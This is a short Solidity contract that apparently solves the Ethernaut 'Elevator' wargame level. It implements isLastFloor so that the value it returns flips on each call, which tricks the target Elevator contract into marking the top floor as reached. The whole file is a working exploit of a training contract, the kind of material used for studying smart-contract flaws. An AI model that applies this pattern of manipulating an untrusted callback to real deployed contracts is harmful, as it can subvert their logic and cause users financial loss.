// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Buildingg {
    bool public top;
    address public elevator;

    constructor(address _elevator) {
        top = false;
        elevator = _elevator;
    }

    function attack() public {
        Elevator(elevator).goTo(8);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool ret = top;
        top = !top;
        return ret;
    }
}
